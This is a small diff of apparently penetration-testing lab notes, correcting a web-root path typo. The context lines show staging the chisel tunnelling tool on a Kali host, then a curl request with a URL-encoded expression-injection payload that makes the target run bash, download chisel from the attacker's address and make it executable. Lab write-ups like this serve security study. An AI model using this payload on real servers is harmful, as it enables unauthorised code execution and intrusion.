@@ -100,7 +100,7 @@ kali$ wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.
 
 kali$ gunzip chisel_1.8.1_linux_amd64.gz
 
-kali$ sudo cp ./chisel /var/www/htm
+kali$ sudo cp ./chisel /var/www/html
 
 kali$ curl http://192.168.212.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.245/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
 
